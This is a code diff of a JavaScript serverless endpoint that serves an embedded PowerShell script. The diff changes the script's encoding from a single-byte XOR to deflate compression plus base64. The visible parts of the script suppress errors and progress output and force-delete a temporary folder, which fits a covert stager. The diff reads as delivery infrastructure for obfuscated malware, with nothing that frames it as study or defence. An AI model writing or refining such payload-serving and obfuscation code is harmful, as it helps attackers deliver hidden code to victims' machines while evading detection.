@@ -1,5 +1,4 @@
-const KEY = 37;
-const CACHE = 'no-store, max-age=0, must-revalidate';
+const zlib = require('zlib');
 
 const PAYLOAD = String.raw`$ErrorActionPreference='SilentlyContinue'
 $ProgressPreference='SilentlyContinue'
@@ -206,10 +205,9 @@ Start-Sleep 2
 Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue`;
 
 module.exports = (req, res) => {
-  const buf = Buffer.from(PAYLOAD, 'utf8');
-  for (let i = 0; i < buf.length; i++) buf[i] ^= KEY;
+  const b = zlib.deflateRawSync(Buffer.from(PAYLOAD, 'utf8'));
   res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-  res.setHeader('Cache-Control', CACHE);
+  res.setHeader('Cache-Control', 'no-store, max-age=0, must-revalidate');
   res.setHeader('Access-Control-Allow-Origin', '*');
-  res.status(200).send(buf.toString('base64'));
+  res.status(200).send(b.toString('base64'));
 };
